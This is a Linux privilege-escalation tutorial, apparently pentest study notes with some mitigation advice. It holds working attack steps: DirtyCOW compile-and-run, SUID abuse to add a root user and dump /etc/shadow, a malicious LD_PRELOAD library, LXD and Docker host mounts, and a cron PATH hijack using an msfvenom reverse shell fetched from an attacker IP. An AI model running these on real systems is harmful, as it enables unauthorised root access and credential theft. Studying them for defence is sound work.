# Privilege Escalation on Linux

It's most pertinent to enumerate the system first in the same way that you might have enumerated the network.
We need to get a frame of reference for what applications and services are running, what ports are open, what users exist, and where applications are configured.

Important information to gather:

* Distribution Type
* Kernel Version
* Running Applications
* Running Services
* Weak file permissions (SUID / GUID)
* Scheduled Jobs 

### OS, Kernel, Hostname

```bash
cat /etc/issue
cat /proc/version
hostname
uname -a
cat /etc/centos-release || cat /etc/redhat-release
```

With this information retrieved, we can check searchsploit, Exploit-db and Google if the kernel has any vulnerabilities. We can also check for the OS version to determine kernel exploits.

When checking for exploits, it's a good idea to check against the full kernel like:

```bash
Linux kernel 3.10.0-123
Linux kernel 3.10.0
Linux kernel 3.10
Linux kernel 3.1
```

### Users

```bash
cat /etc/passwd
id
who
w
sudo -l
```

### Sudoers

The sudoers file allows sudo permissions - this can be all, or some subset of commands allowed to be executed as the root user. 
```bash
# Permits useraccount to execute apt-get and shutdown as root
useraccount ALL=/usr/bin/apt-get,/sbin/shutdown
```

### Networking

```bash
# Network Adapters
ifconfig -a
ethtool
# Routing table
route
# Active connections
netstat -pantu
# Arp table entries
arp -e
```

### Applications and Services 

```bash
ps -aux
ps -elf
ps aux | grep root

dpkg -l || rpm -qa
pip freeze
find /etc/ "*.conf" 
ls -las /var/www/html
### configuration.php and wp-config.php can contain sensitive information
find / -user root -perm 4000 -print 2>/dev/null
```

### Files and Filesystems

```bash
cat /etc/fstab
# Finding world-writable files
find / \( -path /proc -o -path /sys -o -path /usr/share \) -prune -o -type f -perm /o=w

# Finding world-writable directories
find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root

# For root:
find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep root

# World writable files
find / \( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \) -o \( -type f -perm -0002 \) -exec ls -l '{}' ';' 2>/dev/null

find /etc -perm -2 -type f 2>/dev/null
find / -writable -type d 2>/dev/null
getcap -r / 2>/dev/null
```

https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
http://netsec.ws/?p=309

### Automation

How much easier would it be to run a script that does much of this for us? Enter `LinPEAS` - Linux Privilege Escalation Awesome Script.

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```

[LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

### Linux Privilege Escalation Checker

A python script that checks for privilege escalation vulnerabilities - will suggest local privilege escalation exploits for the system.

```bash
wget http://www.securitysift.com/download/linuxprivchecker.py
```

### Unix-privesc-check v1.4

Another tool by pentestmonkey - attempts to find misconfigurations that permit escalation.

http://pentestmonkey.net/tools/audit/unix-privesc-check

```bash
./unix-privesc-check standard
./unix-privesc-check detailed
```



## Exploiting the Linux Kernel

Lets use the DirtyCOW exploit.

```bash
wget http://www.exploit-db.com/download/40616 -O cowroot.c
```

Once downloaded, we need to uncomment the correct payload (x86 or x64) as both are included.
Afterwards, we can compile the exploit:

```bash
gcc cowroot.c -o cowroot -pthread
```

Lastly, we can run the exploit:

```bash
./cowroot
```

With permissions successfully escalated, comments suggest to run the following command to prevent the system from becoming unstable and crashing:
```bash
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
```

### Remediation and Mitigation

Objectively dissecting this, a successful DirtyCOW exploitation requires **5** mechanisms to succeed:

1. A vulnerable kernel
2. A working exploit
3. A way to transfer the exploit
4. A way to compile the exploit
5. A way to execute the exploit



### Preventing Transfer

We can disable any unnecessary tools and services. As some of these are useful for other purposes, another mechanism might be specifically 'allowlisting' who can usese programs / utilities. Optionally, usage of such tools can be monitored. 

* FTP
* TFTP
* SMB
* SCP
* wget
* Curl

### Removing compilation Tools

Prevent or disallow compilation tools! GCC / CC and others should only be installed for as long as actively needed for usage. It's also important to restrict usage to specific user accounts. 

### Preventing Execution

It is important to limit writable and executable directories for system users and services. Specifically /tmp and /dev/shm should be separately partitioned, and mounted with `noexec`. To restrict applications, you can set permissions to `rwx------` or `700` to ensure only the appropriate user can execute.

## Exploiting SUID

`SUID` means `set user ID` - allows lower permissioned users to execute a file as the file owner. For example, `ping`, or `nmap` require root permissions to open raw network sockets, or `passwd` which allows a user to change the account password.

This is a double edged sword - it allows elevated permissions for single applications, only when needed. It's also possible however to be abused to edit files or execute commands with unintended permissions.

### Nano

To demonstrate the potential for abuse, lets add SUID to the text editor Nano. 

```bash
# Add the SUID flag
chmod u+s /bin/nano
# Find all SUID files
find /* -user root -perm -4000 -print 2>/dev/null
```

With SUID on the editor, we can now edit any file as the root user. How about passwd?

``` bash
nano /etc/passwd

# root:x:0:0:root:/root:/bin/bash
# root: = username
# :x: = Password - `x` indicates stored in /etc/shadow
# :0: = UID
# :0: = GID
# :root: = GECOS field for full name etc.
# :/root = Home Directory
# :/bin/bash = Command line shell on login

```

Armed with this information, we can add a new root user to the system. 
In order to do so however, we do need a crypt hash from a password for the 2nd field.

```perl
perl -e 'print crypt("PASSWORD123", "salt") "\n"'
# returns poD7u2nSiBSLk
# Open passwd with nano again
nano /etc/passwd
# Add a new root user
pom:poD7u2nSiBSLk:0:0:root:/root:/bin/bash
# Switch to the new root user
su pom
# Verify identity
id
```

An alternative to adding a new user, could simply be to update the `/etc/sudoers` file:

```bash
# User privilege specification 
root     ALL=(ALL:ALL) ALL
sam      ALL=(ALL:ALL) NOPASSWD:ALL

# After saving, verify sudo
sudo id
```

Another possibility is setting the SUID bit on something like `Python` or `Perl` which can be easily abused by running scripts. 

```bash
# Determine if Python has SUID
find /usr/bin/* -user root -perm -4000 -print 2>/dev/null

# Gain root
/usr/bin/python3.9 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

Yet another possibility is a program like `Cat`. Cat is used for reading files, but in this case with SUID can be used to read and dump the contents of /etc/shadow which can then be brute forced by John or Hashcat.

```bash
sam:$6$.n:18941:0:99999:7::::
# sam: = Username
# :$6$.n: = Encrypted Password
# :18941: = Last password change
# :0: = Minimum password age
# :99999: = Max password age
# :7: Warning Period
# :: Inactivity Period
# :: Expiration Date
# : Unused
```

So what can we do?
First create two files from `/etc/passwd` and `/etc/shadow`. 

```bash
cat /etc/passwd | grep -E "root:x:|sam:x:" > passwd.txt
cat /etc/shadow | grep -E "root:|sam:" > shadow.txt
```

Next unshadow the files to combine them, so they are in a format `John` can utilize.

```bash
unshadow passwd.txt shadow.txt > unshadowed.txt
```

Lastly, we can crack the entries:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```

## Exploiting SGID 

`SGID` is similar, except it applies to groups. 
https://www.redhat.com/sysadmin/suid-sgid-sticky-bit

```bash
find / -type d -perm -02000
```

### Mitigation

You should check regularly for SUID binaries, in particular 3rd party binaries with command execution, and application that don't need it. SUID is pretty pervesaive, and can be hard to discover. A netcat reverse shell with SUID would run as root by default. 

## LD_PRELOAD Privilege Escalation

`LD_PRELOAD` is an optional environment variable of paths to libraries to load into memory before a program is run.  
Many programs use shared libraries , and we can use the `ldd` tool to verify shared object dependencies. 
The implications of this are if a binary executed with sudo or root permissions can pre-load a library with vulnerabilities with the same permissions (root). 

### Sudo LD_PRELOAD 

A privilege escalation vector to keep an eye out for: sudo can use LD_PRELOAD to load shared libraries. This flag is set and can be set in the `sudoers` file with the `env_keep+` flag. This can be verified with `sudo -l`.

We can take advantage of this (mis)configuration by creating a malicious shared library.

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init()
{
  unsetenv("LD_PRELOAD");
  setgid(0);
  setuid(0);
  system("/bin/sh");
}
```

We can compile the library:

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

The output file is named `shell.so` - once transferred, we can add the shared library file to the LD_PRELOAD environment variable with the following:
```bash
# We are running apache2 as the user `lucky` which has nopassword sudo permissions.
# Consequently, we can pass the LD_PRELOAD var and sudo execute apache2 as root without a password.
sudo LD_PRELOAD=/tmp/shell.so apache2
```

## LXD Privilege Escalation

LXD is an open source container manager to build and manage Linux containers on a Linux host. LXD uses a container technology called LXC (Linux Containers) and uses a REST API that is accessible over both a UNIX socket locally, and over the network if enabled. The provided LXD client then communicates with the API for actions.

> LXC = userspace interface with the Linux kernel containment features.
> https://linuxcontainers.org/lxc/introduction
>
> LXD = Next Generation system container manager. 
> https://linuxcontainers.org/lxd/introduction/

Linux hosts running LXD might be vulnerable to privilege escalation.
LXD is a root process that performs actions for anyone with write access to the LXD socket. Write access to the socket is provided through the `lxd` group. One example of compromise is to mount the root filesystem of the host container into a container. This permits a low level user direct access to the host root filesystem (such as `/etc`).

### Walkthrough mounting root filesystem

1. Verify the user is in the `lxd` group

2. Download and build latest Alpine Linux

3. Transfer the tarball to the host

4. Import the image on the target, assign privileges, mount the disk

5. Spawn a shell and access the filesystem

   ```bash
   # Confirm the user is in the lxd group
   id
   # Clone the LXD Alpine Repo
   git clone https://github.com/saghul/lxd-alpine-builder.git
   cd lxd-alpine-builder
   # Build the image
   ./build-alpine
   # Serve the image
   python -m SimpleHTTPServer 80
   -----
   # Switch to the target host
   ----- 
   # Cd to a tmp
   cd /tmp
   # Download the tar
   wget http://[host IP]/<tarball file>
   # [Optional] it might be necessary to run lxc init
   lxc init
   # Import the image
   lxc image import <image tarball> --alias myimage
   # Verify the image was imported
   lxc image list
   # Assign permissions
   lxc init myimage shell -c security.privileged=true
   # Mount the host filesystem
   lxc config device add shell mydevice disk source=/ path=/mnt/root recursive=true
   # Start a shell
   lxc start shell
   # Verify the shell is running
   lxc ls
   # Exec into the shell
   lxc exec shell /bin/sh
   # Once in the shell, we have access to the host filesystem
   cat /mnt/root/root/key.txt
   ```

   https://linuxcontainers.org/lxd/docs/master/security

   https://bugs.launchpad.net/ubuntu/+source/lxd/+bug/1829071

   Https://shenaniganslabs.io/2019/05/21/LXD-LPE.html

   https://github.com/sgahul/lxd-alpine-builder

### Docker Privilege Escalation

Like `lxd`, a user with the `docker` group access, is equivalent to root access. It is possible to break out of a docker container, and gain root acess to the host. 
https://www.docker.com/resources/what-container
https://opensource.com/resources/what-docker
https://gtfobins.github.io/gtfobins/docker

```bash
# Run a public docker image named ubuntu, and command uname -a
docker run ubuntu uname -a

# Get a shell
docker <container> run -it ubuntu /bin/sh
```

So how do get privilege escalation?
Let's start by mounting the host filesystem in the container:

```bash
# Mount the host /home directory to /mnt in the container
docker run -v /home:/mnt -it ubuntu

# Mount /etc to /mnt
docker run -v /etc:/mnt -it ubuntu
# Once mounted in the container shell, we can retrieve contents of passwd/shadow
# We can also just add a new user to /etc/passwd:
echo 'pom:poD7u2nSiBSLKL0:0:root:/root:/bin/bash' >> /etc/passwd
# Exit the container
exit
# Switch to the pom user and verify identity
su pom
id
```

### Mitigating Docker Privilege Escalation

Essentiallly, being a member of the Docker group is the equivalent of root. 
An effective strategy then is to have the Docker daemon run containers in `rootless` mode. This allows containers to run as a non-root user to limit privilege escalation. 
This executes Docker daemon and containers inside a user namespace, which separates user ID's and group ID's between the docker host and the containers, providing container isolation. 
In practice, this means a privileged user in the container, is mapped to a non-privileged user on the host.
https://docs.docker.com/engine.security/userns-remap/

## Path Manipulation

`PATH` is an environment variable which specifices where binaries / executable programs are located. This allows executing with solely a binary name, instead of a relative / fully qualified path. 
On Linux this is viewable via:

```bash
echo $PATH
```

On Windows this is accessible via `Avanced System Settings -> System Properties -> Environment Variables`.

The path can be updated to include new directories:
```bash
export PATH=$PATH:/home/kali
```

What's interesting about this however is now binaries in `/home/kali` can be access by calling their name. What if you are developing, and want to call the `local` implementation, not the one in /home/kali? 
This could mean simply adding the `cwd` or `.` to the path, like `export PATH=$PATH:.`

Lets look at a cronjob misconfiguration where we can take advantage of this fact.

```bash
# Runs a backup script every five minutes
cat /etc/crontab
SHELL=/bin/bash
PATH=.:/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root
*/5 * * * *    root      /usr/local/bin/backup.sh

# The backup script:
#!/bin/bash
cd /var/www/html/administrator
tar cf /var/backups/backuplogs.tgz logs
```

Because `$PATH` first includes the `.` it first check for the tar program in the current directory, which in the case of the script is the web root folder. This means we can put a malicious program named tar in the web root directory, which the cronjob will execute as root.

```bash
# Let's create a reverse shell payload _named_ tar
msfvenom -a x64 --platform Linux -p linux/x64/shell_reverse_tcp LHOST=172.16.1.1 LPORT=4443 -f elf-so -o tar
# Use Wget to get it to the webroot
python3 -m http.server 80
----
#Target
----
cd /var/www/html/administrator
wget http://172.16.1.1/tar
chmod +x tar
```

Once the cronjob runs, it will first execute the malicious tar payload, creating a reverse shell back to our host with root permissions. Win!

